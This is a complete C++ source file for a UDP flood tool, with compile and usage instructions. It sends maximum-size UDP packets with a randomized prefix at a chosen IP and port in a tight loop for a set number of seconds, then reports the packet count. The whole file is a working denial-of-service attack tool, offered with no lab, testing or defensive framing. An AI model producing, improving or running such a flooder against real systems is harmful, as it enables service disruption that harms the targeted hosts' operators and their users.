// ============================================================
// udp_flood.cpp — UDP bandwidth/pps flood
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o udp_flood udp_flood.cpp
// Usage:   sudo ./udp_flood <target_ip> <port> <seconds>
// ============================================================
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <random>

int main(int argc, char** argv) {
    if (argc < 4) return 1;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(std::atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &dst.sin_addr);

    char buf[1472];
    std::memset(buf, 'A', sizeof(buf));
    std::mt19937 rng{std::random_device{}()};

    time_t end = time(nullptr) + std::atoi(argv[3]);
    uint64_t sent = 0;
    while (time(nullptr) < end) {
        *(uint32_t*)buf = rng();
        sendto(s, buf, sizeof(buf), 0, (sockaddr*)&dst, sizeof(dst));
        sent++;
    }
    std::printf("[+] sent %llu packets\n", (unsigned long long)sent);
    return 0;
}
